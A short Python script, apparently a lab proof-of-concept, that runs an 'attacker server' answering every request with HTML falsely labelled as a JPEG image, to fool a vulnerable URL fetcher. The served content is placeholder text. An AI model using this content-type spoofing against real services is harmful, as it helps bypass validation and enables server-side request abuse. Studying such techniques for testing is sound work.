from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Always respond OK
        self.send_response(200)
        # Trick the vulnerable fetcher: fake image header
        self.send_header("Content-Type", "image/jpeg")
        self.end_headers()
        # Serve HTML pretending to be an image
        html = "<html><body><h1>Internal Admin Panel</h1><p>Secret data leaked!</p></body></html>"
        self.wfile.write(html.encode())

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8080), Handler)
    print("Attacker server running on port 8080")
    server.serve_forever()
